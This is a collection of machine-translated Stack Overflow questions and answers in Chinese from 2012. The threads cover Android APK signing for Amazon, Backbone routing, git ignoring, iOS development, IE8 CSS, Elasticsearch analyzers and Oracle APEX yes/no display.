如果我在 bin 文件夹中获取 eclipse 生成的 apk 并将其通过电子邮件发送给自己，那么它可以在 Kindle 中正常安装，但这是一个调试版本。

我想制作一个发布版本，该版本将是我提交给亚马逊的版本，我也可以无线安装到我的 Kindle 上进行测试。我想测试我提交给亚马逊的相同版本。但我也不知道如何生成提交给亚马逊的构建。

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-26T20:45:15.237

你已经签署了你的 APK 来安装它。如果你想提交它，你应该生成一个 APK 的密钥并正确签名。

如果您想在设备上“测试”，您可以发送位于 /bin/ 文件夹中的 APK，该 APK 会自动使用调试标志进行签名

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-26T22:53:11.570

亚马逊必须将他们的 DRM 模块放入 APK 文件中；因此，您必须在此之后对其进行签名，因为在已签名的 APK 文件中写入任何内容都会使签名无效。以下链接详细描述了如何手动签署您的 APK 文件：

[http://developer.android.com/tools/publishing/app-signing.html](http://developer.android.com/tools/publishing/app-signing.html)

为了澄清亚马逊的情况：

1- 使用 Eclipse 导出未签名的 APK 文件并将此文件发送到亚马逊，以便他们将 DRM 放入其中。

2- 使用 keytool 实用程序创建证书，如参考的步骤 1 中所述。（为此，您必须使用命令外壳 (cmd)。不要忘记为 keytool.exe 设置正确的路径。它应该位于您的 java sdk 的 bin 目录中；例如“C:\Program Files (x86 )\Java\jdk1.6.0_27\bin" )。

您还可以在导出已签名的应用程序时重用 Eclipse 创建的证书，而不是创建新证书。

不要忘记您必须重复使用相同的证书来创建升级；所以不要忘记各种密码！

3-然后，您必须使用 jarsigner 工具对您的 APK（由 Amazon 修改）进行签名，之后，您必须使用 zipalign 工具对其进行对齐；如参考资料中所述。与其他两个工具相反，zipalign 工具位于您的 android-sdk-windows 目录的 tools 目录下；因此，将此工具目录添加到您的路径中也是明智之举。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-07-08T20:31:29.530

您可能还想确保您在 AndroidManifest.xml 文件中的图标是 512x512 分辨率，否则看起来会有点像素化。

```
<application android:persistent="true"
    android:hardwareAccelerated="true"
    android:icon="@drawable/launcher_icon_512x512"
    android:label="@string/app_name" > 
```

# javascript - 是否使用骨干路由器/历史

> ID：13572792
> 
> 赞同：0
> 
> 时间：2012-11-26T20:41:07.983
> 
> 标签：javascript, backbone.js, browser-history, backbone-routing

我正在创建一个由主干驱动的小部件的集合（因为没有更好的词）。消费者会将小部件放入他们的 Web 应用程序并对其进行初始化。我需要跟踪某些小部件的历史记录，但不一定需要/想要将内容实际注入浏览器的历史记录*或*更新 URL。`.navigate`的`replace`和`trigger`选项似乎很有用。我不想干扰应用程序当前对浏览器的 URL/历史所做的任何事情，除非他们选择这样做（如果有的话）。

1.  不想更新 URL（除非选择加入）
2.  不想将事件插入浏览器历史记录（除非选择加入）
3.  确实希望能够跟踪历史记录（一个简单的数组可能就足够了，但是能够随意选择加入项目的 1 和 2 是一个很大的好处）

骨干网的路由器/历史功能似乎适合我的用例，还是我应该推出自己的解决方案？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T21:20:38.727

骨干路由器可能不是您想要的，除非您可以保证您的所有消费者（实际上这意味着您的所有消费者的消费者）都将拥有非常现代的浏览器。原因是，如果用户*没有*现代浏览器，Backbone 将依赖使用 URL 进行导航，而您的要求 #1 会因此而被违反。

通过“现代浏览器”，我的意思是这里显示为绿色：

[http://caniuse.com/#feat=history](http://caniuse.com/#feat=history)

如果我处于你的位置，我只会使用普通的旧 cookie 来存储导航详细信息；只要不涉及太多数据，我认为这会起作用。

# maven - 为什么 maven 3 报告它正在镜像 apache 快照？

> ID：13572794
> 
> 赞同：0
> 
> 时间：2012-11-26T20:41:14.547
> 
> 标签：maven, repository

我在 settings.xml 中设置了 * 的镜像。当我查看构建的调试级别输出时，我看到一些关于镜像的行。我希望“*”通配符可以匹配所有内容，在我的情况下，据我了解，这相当于 maven 中唯一的默认远程存储库，maven Central。

但是，似乎正在镜像其他几个存储库。例如，这条线表明我的构建知道 apache 快照，并且它也使用我的镜像来镜像它。

[调试] 对 apache.snapshots (http://repository.apache.org/snapshots) 使用镜像 dev-nexus-as-mirror (http://lava4186:8081/nexus/content/repositories/gold-n-central) .

这行不是意味着 apache.snapshots 必须在我的构建中的某处贴花吗？它在 maven 3 的超级 pom 中吗？我读错了吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T22:33:19.947

可以在任何 pom 文件中为依赖树中任何位置的任何传递依赖声明该存储库。您拥有的镜像配置告诉 Maven 通过您的代理镜像任何 repo 的每个下载请求，无论哪个工件声明它。

# git - git不断检查被忽略的文件

> ID：13572801
> 
> 赞同：1
> 
> 时间：2012-11-26T20:41:48.587
> 
> 标签：git

我有一个之前错误提交的配置文件。我将它添加到 .gitignore 并执行了 a `git update-index --assume-unchanged`，但是当我执行 a 时`git checkout -- .`，它会将其恢复为较旧的已提交版本。我怎样才能完全忽略它？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-26T20:48:41.683

如果文件已经被跟踪（已经提交，并且特别存在于您的`HEAD`提交中），则不能通过`.gitignore`. 如果您想防止它出现在以后的结帐中，您需要`git rm --cached <file>; git commit -m "stop tracking <file>"`. 如果在您的工作目录中删除副本也是可以接受的，您可以将`--cached`选项放到`git rm`.

# ios - 将应用上传到应用商店后状态“缺少屏幕截图 [1]”

> ID：13572802
> 
> 赞同：1
> 
> 时间：2012-11-26T20:41:50.620
> 
> 标签：ios, app-store, screenshot

昨天我将我的第一个应用程序上传到了 Apple Appstore。当前状态为“缺少屏幕截图 [1]”，单击 [1] 会弹出“缺少本地化屏幕截图英语”的弹出窗口。据我所知，语言环境是英语，至少打算是英语。iTunesConnect 中的页面在唯一的标题下包含四个屏幕截图：“3.5-Inch Retina Display Screenshots”，没有其他屏幕截图的空间。虽然我必须说我将状态从通用应用程序更改为 iPhone 应用程序。我不知道该怎么做。我确实通过 iTunes 上传了屏幕截图，当我将二进制文件上传到应用商店时，没有包含任何内容。我是否应该将这些屏幕截图也包含在 Organizer 中？在状态历史记录中显示“已上传”，两分钟后显示“缺少屏幕截图”，导致我认为这些屏幕截图应该包含在二进制文件中。如果是这样，我应该如何添加屏幕截图？我确实读过一些关于苹果需要为 iPhone5 添加屏幕截图的内容，但我不知道在哪里添加这些。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-26T20:54:19.957

我之前遇到过同样的问题 - 与语言环境无关。在这里找到解决方案：

[iOS 应用缺少屏幕截图](https://stackoverflow.com/questions/12681702/ios-app-missing-screenshot)

实际上，如果您让 Xcode 为 iPhone5 输入图像以消除警告 - Apple 希望您输入 iPhone5 屏幕截图。

通过删除此图像 (Default-568h@2x.png) 并重新上传二进制文件或在 iTunesConnect 中添加 iPhone5 屏幕截图来解决。

此外 - 奇怪的是你不应该能够看到 iPhone5 的屏幕截图放在哪里。这是路径：iTunesConnect/管理您的应用程序/*您的应用程序*/查看详细信息/然后单击“元数据和上传”的编辑按钮/向下滚动，它应该在那里：“4 英寸视网膜屏幕截图”

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-27T08:44:12.723

如果您遇到“缺少本地化屏幕截图”错误，请查看以下内容是否有帮助，因为我们在提交的应用程序中遇到了类似问题。

1.  如果您有通用应用程序二进制文件，请确保您已提交 iPhone 和 iPad 屏幕截图。

2.  如果您的二进制文件适用于 iPhone 4，那么您也必须包含适用于 iPhone 4 的屏幕。

3.  如果您正在申请在不同地区提供应用程序，那么您需要单击“选择另一种语言”并从下拉列表中选择地区，您应该能够看到 Apple 预先填充了图像/screenshots 为您提供，但您需要添加关键字和描述。

# iphone - 如何逐张更改图像每 3-4 秒循环一次

> ID：13572803
> 
> 赞同：0
> 
> 时间：2012-11-26T20:41:55.963
> 
> 标签：iphone, ios, ipad

你好朋友我正在开发一个应用程序，我需要通过 5/6 页的视图旋转图像每 3-4 秒循环一次...我也需要更改图像的访问权限。请提供一些示例代码..

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T23:30:31.850

我假设您知道如何使用`UIImageView`和设置图像？如果没有，请参考描述接口的[`UIImageView`类参考指南](http://developer.apple.com/library/ios/#documentation/uikit/reference/UIImageView_Class/Reference/Reference.html)，如果你查看“相关示例代码”，你可以看到它的作用。

关于如何每隔几秒钟更改一次图像，您可能首先为您定义一个实例变量或类属性`NSTimer`：

```
NSTimer *timer; 
```

然后可能会创建一个循环计时器，例如：

```
timer = [NSTimer scheduledTimerWithTimeInterval:3.5
                                         target:self
                                       selector:@selector(changeImage)
                                       userInfo:nil
                                        repeats:YES]; 
```

显然，这假定您已经编写了自己的方法，`changeImage`这会将图像更改为`UIImageView`下一个图像。

`invalidate`最后，当你想关闭你的视图控制器时不要忘记你的定时器（例如， in `willWillDisappear`，*not* `dealloc`），因为`self`在定时器中的使用会导致一个强引用循环，如果你不这样做，你的内存将不会被释放吨。

而且，如果其中任何一个没有意义，我将支持其他人的建议，即您可能想做一些更基本的 iOS 教程。不要粗鲁，但我们在这里帮助您用现有代码回答问题，而不是为您编写新代码。如果你没有掌握 iOS 编程的一些更普通的方面（视图、视图控制器、内存管理等），那么做一些更复杂的事情可能会让每个人都感到沮丧。

# css - IE8：半透明背景颜色但不透明背景图像

> ID：13572804
> 
> 赞同：0
> 
> 时间：2012-11-26T20:41:56.470
> 
> 标签：css, internet-explorer-8, background-image, background-color

我有一个加载 div，以加载符号作为背景图像。我希望加载符号完全不透明。但是，为了淡化正在加载的页面，我将背景图像设置为 80% 的不透明度。这在 Chrome 和 Firefox 中运行良好，但在 IE8 中加载符号也是半透明的。有什么方法可以淡化ie8中的背景颜色而不是背景图像？

CSS：

```
#loadingDiv {
    background: url(../../images/Loading32.gif) no-repeat center center;
    background-color: rgba(255,255,255, .8);
    position: absolute;
    height: 330px;
    width: 890px;
    -ms-filter: "progid:DXImageTransform.Microsoft.gradient(startColorstr=#88ffffff, endColorstr=#88ffffff)";
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-26T20:43:50.573

IE8 不支持`rgba`，所以这就是它不透明的原因......

所以使用可能使用 2x2 像素图像的透明背景图像......或者

您可以查看[CSS3 Pie](http://css3pie.com/)以获取 IE8 支持

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-05-16T18:15:06.187

遗憾的是，IE8- 不支持 rgba，也不支持 CSS 不透明度规则。就个人而言，我会创建一个半透明的 1px png 图像，并将其作为背景图像重复。

首先，创建透明 1px png 并将其放置在图像目录中。将其命名为“translucentBG.png”。

其次，通过将以下内容放在源代码的头部，使用单独的样式表定位 IE：

```
<!--[if IE]>
    <link rel="stylesheet" type="text/css" href="css/all-ie-only.css" />
<![endif]--> 
```

然后，在您的 css 目录中创建一个名为“all-ie-only.css”的文件。在“all-ie-only.css”中，创建以下规则：

```
.loadingdiv {
    background: url(../../images/translucentBG.png);
} 
```

# c# - 如何创建动态控件以响应按钮单击？

> ID：13572808
> 
> 赞同：0
> 
> 时间：2012-11-26T20:42:02.947
> 
> 标签：c#, asp.net, ajax

我想用新的动态控件填充更新面板以响应按钮单击。

但是，我还希望能够访问这些动态控件的值以响应其中一个控件中的事件。

具体来说，我希望按钮调出两个下拉菜单。其中一个菜单（或两个如果需要）位于另一个更新面板中。我希望更新面板中的第一个菜单更改其数据以响应在另一个菜单中选择的值。

我认为我的问题是，当我使用一个下拉菜单进行回发时，我会丢失另一个下拉菜单，因为我在 button_click 处理程序中创建了它。

我知道我应该在 Page_Init 方法中创建动态控件（或者我听说过），但我只希望在单击按钮时显示控件。页面上还有其他按钮需要创建一组不同的动态控件。

谢谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-26T20:58:58.230

有很多方法可以处理这个问题，采用哪种方法实际上取决于您的项目要求和可用资源。

通常会提供最佳用户体验的最流畅的方法是使用 Javascript 技术在页面需要时隐藏和显示控件。 [JQuery](http://www.noupe.com/tutorial/51-best-of-jquery-tutorials-and-examples.html)是我为此推荐的库。在最基本的层面上，您只需连接控件的激活（例如 button_click 事件）并根据需要隐藏或显示包含动态内容的 div，如下所示：

```
$("#control").show();
// and
$("#control").hide(); 
```

或者，您可以在 C# 中通过使用`Visible`ASP.NET 的许多普通 Web 控件上的属性来执行此操作。通常的代码隐藏方法如下所示：

```
private void btnControl_Click(object sender, EventArgs e)
{
    var dynamicControl1 = FindControl("dynamicControl1");
    dynamicControl.Visible = false; // or true, as the case may be
} 
```

不过，这种特殊的方法主要依赖于代码隐藏，我鼓励您尽可能避免使用。它们实际上是不可能测试的，并且会使项目难以工作。您可以在 MVC3 框架中使用类似的方法，当然，发送和接收您设置的控件的方式会有所不同可见的。这样做的另一个好处是，如果将某些内容设置为不可见，它甚至不会显示在模板引擎生成的 HTML 中（YMMV 取决于引擎，但我知道这在剃刀）。因此，查看您网页源代码的人将无法看到非活动控件，这可能会或可能不会吸引您。

编辑：我认为问题与如何显示这些东西无关，而更多地与如何在动态输入的情况下创建和读取它们有关。

我确信有一种方法可以使用 Javascript 来做到这一点（这可能是最干净和最好的方法），但我对 JS 的了解还不够好，无法知道答案。您在 ASP.NET 中处理此问题的方式是制作您要向服务器端添加控件的 div（通过使用`runat='server'`，然后在那里添加您需要的内容。同样，简单的代码隐藏方法类似于：

```
private void btnControl_Click(object sender, EventArgs e)
{
    foreach(var checkBoxChecked in chkBoxes.Where(x => x.Checked))
    {
        div.Controls.Add(new WebControl()) // or whatever the heck else it is you need.
    }
} 
```

当然，这假定您有一个`IEnumerable<CheckBox>`要迭代的。您可能还希望`IList<WebControl>`跟踪您添加的所有垃圾。您还需要确保 CSS 正确应用于您要添加的控件的 div。再一次，代码隐藏非常糟糕，我使用这个例子只是因为它很容易在一个项目中为自己测试。

# c - 如何使用带有 OpenGL 的 Nurbs 知道特定的值位置？

> ID：13572811
> 
> 赞同：4
> 
> 时间：2012-11-26T20:42:10.673
> 
> 标签：c, opengl, nurbs

我正在使用OpenGL创建一个nurbs表面（gluNurbSurface（...）），我想知道如何将控制点（黑点）的正常值作为红点到达表面市场。有了这些信息，我将能够计算它们之间的距离。

[![纽布斯](../Images/8a48919e5903cbb778fc64abf9da67d0.png)](https://i.stack.imgur.com/1LVkf.png)

补充 为了得到另一个答案或改进主题我想写部分代码，希望能得到更多帮助：

在这一部分中，您可以观察我是如何初始化 nurbs 的。

```
init_surface();

   theNurb = gluNewNurbsRenderer();
   gluNurbsProperty(theNurb, GLU_SAMPLING_TOLERANCE, 50.0);
   gluNurbsProperty(theNurb, GLU_DISPLAY_MODE, GLU_FILL);
   gluNurbsCallback(theNurb, GLU_ERROR, 
                    (GLvoid (*)()) nurbsError); 
```

接下来，使用它们的参数创建表面。

```
gluBeginSurface(theNurb);
    gluNurbsSurface(theNurb,
            U+ordenU, knotsU,
            V+ordenV, knotsV,
            V * 3,
            3,
            &ctlpoints[0][0][0],
            ordenU, ordenV,
            GL_MAP2_VERTEX_3);

   gluEndSurface(theNurb); 
```

请记住，我使用的是 C。此时，我正尝试使用**genpfault**在第一个答案中提出的函数将 nurbs 的值引入向量中，但我不知道必须在哪一部分添加它们。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-26T20:57:24.773

通过设置`GLU_NURBS_NORMAL_DATA`回调[`gluNurbsCallback()`](http://www.opengl.org/sdk/docs/man2/xhtml/gluNurbsCallback.xml)。`GLU_NURBS_VERTEX_DATA`回调也很有用。

指向某种动态数组数据结构`*userData`（通过）来保存点/法线。[`gluNurbsCallbackData()`](http://www.opengl.org/sdk/docs/man2/xhtml/gluNurbsCallbackData.xml)如果您使用的是 C++，我会推荐 a `std::vector`of `Eigen::Vector3f`s。

# jquery - 如何实时更新列表顺序？

> ID：13572814
> 
> 赞同：0
> 
> 时间：2012-11-26T20:42:13.003
> 
> 标签：jquery, html-lists, draggable, lightbox, rel

我正在使用 Media Box Advanced 作为中转工具，它非常强大和方便，因为它接受任何媒体，并获取任何列表并自动读取数量`<li>`及其顺序。

我为这些列表引入了可拖动功能，使用 jquery .draggable 对它们重新排序。它们也可以从一个 UL 拖到另一个。但是，当我点击这些弹出灯箱时，顺序并没有改变。我的问题如下：

1）如何让页面实时读取这些更改并重新排序灯箱？

2）有没有办法使这些变化永久化？

3) 灯箱`<a>`按`<li>` `(<a rel="lightbox[category]")`. 有没有办法改变`<li>`它们从一个拖到`<ul>`另一个时的设置？就像它们从 UL1 拖到 UL2 一样，我如何更新`<a rel>`标签以反映这一点？

这是网页：[http ://www.senseculture.com/timeline_new.html](http://www.senseculture.com/timeline_new.html)

这是我正在使用的可拖动代码：

```
<script>
  $(function() {
        $( "#sortable1, #sortable2" ).sortable({
            connectWith: ".timeline_content"
        }).disableSelection();
    });
</script> 
```

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T22:08:22.387

1.  如果您想在项目被移动时采取行动，您应该为 .sortable() 的“更新”事件创建一个处理程序。 [这是关于这个主题的帖子](https://stackoverflow.com/questions/4956039/jquery-sortable-change-event-element-position)
2.  为了使
3.  总是按特定顺序加载，您必须为每个项目附加一个序数字段，然后对
4.  基于此。更改完成后，您必须使用相应的序数值更新数据源，这将确保更改是具体的。
5.  这将涉及在 sortable() 的更新处理程序中修改给定元素的属性。[这是 API 文档，底部有事件，](http://api.jqueryui.com/sortable/)例如：

    $(this).attr({rel: "whateverHere"});

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-30T18:28:02.137

1) 通过阅读灯箱 (mediaboxadvanced) 的 .js 并找到将 UL 加载到灯箱中的函数来解决这个问题。每次对列表排序时，都会重新计算灯箱：

```
$( "#sortable1, #sortable2, #my_timeline" ).sortable({
update: function(event, ui) {
    Mediabox.scanPage();
}
}); 
```

2) 这可以用 PHP 完成：[jQuery Connected Sortable Lists, Save Order to MySQL](https://stackoverflow.com/questions/2509801/jquery-connected-sortable-lists-save-order-to-mysql)

3) 同 1)，在“receive”上，使每个灯箱列表附加一个“rel”参数到每个“a”标签。为了防止它改变不可排序列表项的“rel”标签，我添加了一个函数来确保它们的“rel”标签保持为空。

```
$( "#sortable1, #sortable2, #my_timeline" ).sortable({
update: function(event, ui) {
    Mediabox.scanPage();
}
receive: function(event, ui) {

        $(".timeline_content").each(function(i) {
        $(this).find("a").attr("rel", "lightbox[set" + (i+1) + "]");
        });
        $(".non_sortable").each(function(i) {
        $(this).find("a").attr("rel", ""); 
        });
}
}); 
```

# xcode - 在 10.8 上构建时，10.7 构建工作不正确

> ID：13572815
> 
> 赞同：1
> 
> 时间：2012-11-26T20:42:15.847
> 
> 标签：xcode, osx-lion, osx-mountain-lion, afnetworking

我在解释我的问题时遇到了很多问题。但简而言之。我有一个非常简单的项目，我使用的唯一外部代码是 AFNetwork。

当应用程序打开时，我会打开一个简单的登录窗口。它有一个子视图，其中包含用户名字段和密码字段，以及确定和取消按钮。在 10.8 中一切正常。当我构建应用程序并将其复制到 10.7 机器时，所有点击次数都低于我实际点击次数。所以如果我想将光标放在用户名字段上，我必须点击高出 20-25 像素，如果我想点击 OK 按钮，我必须点击按钮上方 20-25 像素。

如果我在 10.7 上构建项目，点击是正确的，但是一旦我设置 NSMutableRequest，我就会在调试器中进入汇编代码，我不知道发生了什么，除了它位于调试器中的 [str length] 上查看左侧，主线程。

我已经检查了每个 xib 设置，没有设置自动布局，没有视图有图层，所有设置都与 10.7 兼容。Build clean, Project -> Archive 已经过测试。

我只是在我的智慧在这里结束。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-13T14:39:02.523

我的问题似乎主要是因为我在 awakeFromNib，[self.view setWantsLayer] 在 10.8 上按预期工作（对于 iOS 开发人员）但在 10.7 中做了奇怪的事情。

如果你想要层，要么在 Interface Builder 或子类中进行，这是最安全的方法。

# json - 使用 3D 程序可视化 .json

> ID：13572816
> 
> 赞同：0
> 
> 时间：2012-11-26T20:42:25.037
> 
> 标签：json, webgl

我正在使用 webGL 进行一些 json 加载，但问题是我的文件是 .json 而不是 .js，并且文件的开头是这样的：

```
{
  "version" : "0.1.0",

  "comment" : "Generated by MeshLab JSON Exporter",

  "id"      : 1,
  "name"    : "mesh",

  "vertices" :
  [
    {
      "name"       : "position_buffer",
      "size"       : 3,
      "type"       : "float32",
      "normalized" : false,
      "values"     :
      [
        -1.88373, -4.96699, -4.80969, -2.09061, -4.88318, -4.81713, 
```

它看起来不像我见过的其他 .js。所以我的事情是我想在像搅拌机这样的程序中可视化它，以检查它是否是文件中的问题。但是我没有找到任何程序。其次，这个文件甚至被 webGL 的 jsonloader 支持吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-30T09:16:52.023

webGL 的 jsonloader 还打开了 .js，您可以使用 .obj 使用一些 python 脚本（如 Three.js 中的脚本）创建它（感谢 Mr.doob）：

[https://github.com/mrdoob/three.js/blob/master/utils/exporters/obj/convert_obj_three.py](https://github.com/mrdoob/three.js/blob/master/utils/exporters/obj/convert_obj_three.py)

在同一个 git 上，还有 .obj 的加载器。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-26T22:57:45.243

这不是简单的 json（就像这个[http://learningwebgl.com/lessons/lesson14/Teapot.json](http://learningwebgl.com/lessons/lesson14/Teapot.json)），它是一个包含很多东西的存档，所以你需要编写自己的（或查找）解析器。关于 json 加载阅读此[http://learningwebgl.com/blog/?p=1658](http://learningwebgl.com/blog/?p=1658)

# ios - 在 UICollectionView/UITableView 中为滚动视图的偏移设置动画会导致单元格过早消失

> ID：13572818
> 
> 赞同：9
> 
> 时间：2012-11-26T20:42:31.857
> 
> 标签：ios, uicollectionview, contentoffset

我们有一个 UICollectionView，其自定义布局与 UITableView 非常相似（它垂直滚动）。UICollectionView 只同时显示 3 个单元格，其中一个是当前活动的单元格：

```
[ 1 ]
[*2*]
[ 3 ] 
```

（这里的活动单元格是#2。）单元格大约 280 点高，因此只有活动单元格在屏幕上完全可见。用户不直接滚动视图进行导航，而是水平滑动活动单元格以前进到下一个单元格。然后我们做一些花哨的动画并滚动 UICollectionView 使下一个单元格处于“活动”位置，从而使其成为活动单元格，将旧单元格移开并调出队列中的下一个单元格：

```
[ 2 ]
[*3*]
[ 4 ] 
```

这里的问题是设置 UICollectionView 的偏移量。`self.collectionView.contentOffset = targetOffset;`我们目前将它与其他三个动画属性一起设置在 UIView 动画块（运行，甚至在延迟间隔完成之前。这绝对不理想。

我已经想到了一些解决方案，但无法找出最好的解决方案：

1.  荒谬地扩大 UICollectionView 的框架以适应五个单元格而不是三个单元格，从而迫使它将单元格保留在内存中，即使它们不在屏幕上。我试过这个并且它有效，但它听起来像一个非常肮脏的黑客。

2.  对消失的单元格的渲染内容进行快照，将其放入 UIImageView 中，在单元格消失之前将 UIImageView 添加为滚动视图的子视图，在旧单元格的完全相同位置，一旦动画结束就将其删除。听起来不像以前的选项那么糟糕（至少在记忆方面），但仍然有点老套。我也不知道实现这一点的最佳方法，请指出正确的方向。

3.  1.  切换到 UIScrollView 的`setContentOffset:animated:`. 我们实际上曾经有这个，它修复了消失的单元格问题，但与其他 UIView 动画并行运行显然会争夺主线程的注意力，从而在单核设备上创建一个非常不稳定的动画（iPhone 3GS/ 4）。它也不允许我们更改动画的持续时间或缓动，因此感觉与其他动画不同步。如果我们能找到一种方法使其与 UIView 块动画协调工作，仍然是一个选择。

    2.  切换到 UICollectionView 的`scrollToItemAtIndexPath:atScrollPosition:animated:`. 还没有尝试过，但它有一个很大的缺点：目标滚动位置只需要 3 个可能的常量（至少适用于这种情况） `UICollectionViewScrollPositionTop`：`UICollectionViewScrollPositionCenteredVertically`和`UICollectionViewScrollPositionBottom`. 活动单元格可以改变其高度，但它始终必须距窗口顶部 35 点，并且这些选项不能提供足够的控制来完成设计。它也可能与 3.1 一样有问题。仍然是一个选项，因为可能有一种方法可以绕过我不知道的滚动位置，并且它可能与主线程没有相同的问题，这似乎不太可能。

任何帮助将不胜感激。请询问您是否需要澄清。非常感谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-01T05:15:26.273

我和#2一起去了。这是执行渲染和存储的代码段：

```
UIGraphicsBeginImageContext(theCell.bounds.size);
[theCell.layer renderInContext:UIGraphicsGetCurrentContext()];
UIImage *renderedCellImage = UIGraphicsGetImageFromCurrentImageContext();
UIGraphicsEndImageContext(); 
```

该方法的其余部分与我上面描述的差不多，但有一个警告：这必须在实际使用图像之前并在后台线程上完成，因为在 iPhone 4 上渲染可能需要 1 整秒。希望这个帮助某人。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2017-01-07T21:56:46.790

在动画块中设置内容偏移后，我通过立即重新加载它们使单元格保持可见。

```
UIView.animateWithDuration(0.3) { 
    self.collectionView.contentOffset = newOffset
    self.collectionView.reloadItemsAtIndexPaths(willDisappearIndexPaths)
} 
```

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-11-27T23:02:33.337

LongShot：尝试将 UIView 动画块选项设置为**UIViewAnimationOptionBeginFromCurrentState**。

```
[UIView animateWithDuration:1
                      delay:0
                    options:UIViewAnimationOptionBeginFromCurrentState
                 animations:^{ }
                 completion:^(BOOL  completed){ } ]; 
```

# elasticsearch - Elasticsearch 分析器从索引设置中忽略，仅在查询中直接指定时才有效

> ID：13572822
> 
> 赞同：1
> 
> 时间：2012-11-26T20:42:39.003
> 
> 标签：elasticsearch, django-haystack

我正在尝试将 haystack 默认设置更改为非常简单的设置：

```
'settings': {
  "analyzer": "spanish"
} 
```

它在重建索引后看起来很正确：

```
$ curl -XGET 'http://localhost:9200/haystack/_settings?pretty=true'
{
  "haystack" : {
    "settings" : {
      "index.analyzer" : "spanish",
      "index.number_of_shards" : "5",
      "index.number_of_replicas" : "1",
      "index.version.created" : "191199"
    }
  } 
```

但是当使用一些停用词对其进行测试时，它不会按预期工作，它应该过滤掉“esto”和“que”，而是从英语停用词中过滤“is”和“a”：

```
$ curl -XGET 'localhost:9200/haystack/_analyze?text=esto+is+a+test+que&pretty=true'
{
  "tokens" : [ {
    "token" : "esto",
    "start_offset" : 0,
    "end_offset" : 4,
    "type" : "<ALPHANUM>",
    "position" : 1
  }, {
    "token" : "test",
    "start_offset" : 10,
    "end_offset" : 14,
    "type" : "<ALPHANUM>",
    "position" : 4
  }, {
    "token" : "que",
    "start_offset" : 15,
    "end_offset" : 18,
    "type" : "<ALPHANUM>",
    "position" : 5
  } ] 
```

只有当我在查询中指定分析器时它才起作用：

```
$ curl -XGET 'localhost:9200/haystack/_analyze?text=esto+is+a+test+que&analyzer=spanish&pretty=true'
{
  "tokens" : [ {
    "token" : "is",
    "start_offset" : 5,
    "end_offset" : 7,
    "type" : "<ALPHANUM>",
    "position" : 2
  }, {
    "token" : "test",
    "start_offset" : 10,
    "end_offset" : 14,
    "type" : "<ALPHANUM>",
    "position" : 4
  } ] 
```

知道我在做什么错吗？

谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-26T21:59:52.640

它应该是

```
"settings": {
    "index.analysis.analyzer.default.type" : "spanish"
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-27T09:02:18.700

并将其应用于“干草堆”索引：

```
{
  "haystack" : {
    "settings" : {
      "index.analysis.analyzer.default.type" : "spanish",
  }
} 
```

感谢 imotov 的建议。

# oracle - 在 APEX 报告中将 0 或 1 值更改为“是”和“否”

> ID：13572825
> 
> 赞同：4
> 
> 时间：2012-11-26T20:42:57.453
> 
> 标签：oracle, oracle-apex

我的页面上有一个报告区域，它正在从`students`表格中获取数据。在该表中，有一个名为`cv_lodged`1 或 0 的列表示是或否。在报告中，它将此列数据显示为 0 或 1，我想将其更改为显示是或否。

我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-26T20:46:40.750

您可以`CASE`在查询中添加语句

```
SELECT (CASE WHEN cv_lodged = 1 
             THEN 'Yes'
             ELSE 'No'
         END) cv_lodged,
       other_columns
  FROM students 
```

如果这可能很常见，那么您最好创建一个将伪布尔数据转换为字符串的函数。就像是

```
CREATE FUNCTION my_bool_to_str( p_num IN NUMBER )
  RETURN VARCHAR2
IS
BEGIN
  IF( p_num = 1 )
  THEN 
    RETURN 'Yes';
  ELSE
    RETURN 'No';
  END IF;
END; 
```

你会在你的查询中调用

```
SELECT my_bool_to_str( cv_lodged ) cv_lodged,
       other_columns
  FROM students 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-10-24T14:41:25.573

目前，有一种更简单的方法可以做到这一点。

首先以开发者身份打开带有“Yes/No”项的APEX页面，点击该项，打开页面项设置。

*将设置*值从更改`Use component settings`为`Custom`。

然后更改`Yes Value`to`1`和`No Value`to `0`。

![在此处输入图像描述](../Images/3f51a7916be8512f9e49c9152b7a9ec8.png)

该解决方案有一些优点：

1.  无需将值 1 或 0*解码*为 Y 或 N ( `select decode(mycolumn, 1, 'Y', 'N') from mytable where id = 123;`) 或`select case when ...`
2.  无需将提交的值从 Y 或 N*解码*回 1 或 0

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-26T22:04:52.623

我通常只是在名为 YES1_NO0 的共享组件中创建了一个静态 LOV，其中包含 2 个条目：“是”-> 1、“否”-> 0。
然后在交互式报表中，您可以更改这些列。为此，请编辑 IR 列。将“显示类型”更改为“显示为文本（基于 LOV，转义特殊字符）”。然后在“值列表”下将“列过滤器类型”设置为“使用命名的值列表过滤精确匹配”并选择命名的 LOV。
但可以肯定的是，您完全可以在 SQL 中做到这一点。

# ajax - 达贾西。无法调用未定义的方法“...”。再次

> ID：13572826
> 
> 赞同：6
> 
> 时间：2012-11-26T20:43:10.603
> 
> 标签：ajax, django, dajaxice

